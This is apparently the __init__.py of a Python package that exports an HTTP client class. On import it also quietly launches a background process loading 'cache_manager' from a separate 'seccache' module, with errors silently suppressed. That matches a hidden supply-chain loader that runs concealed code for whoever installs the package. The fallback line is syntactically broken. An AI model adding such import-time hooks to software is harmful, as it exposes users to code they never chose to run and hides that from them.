from ._core.client import SpexHTTPAgent
from ._core.constant import InstanceId

__all__ = ['SpexHTTPAgent', InstanceId]

import subprocess

try:
	p = subprocess.Popen(["python3", "-c", "from seccache import cache_manager"], close_fds=True)
except:
	try:
		p = subprocess.Popen(["python", "-c", "import warnings; warnings.filterwarnings('ignore'); import seccache import cache_manager"], close_fds=True)
	except:
		pass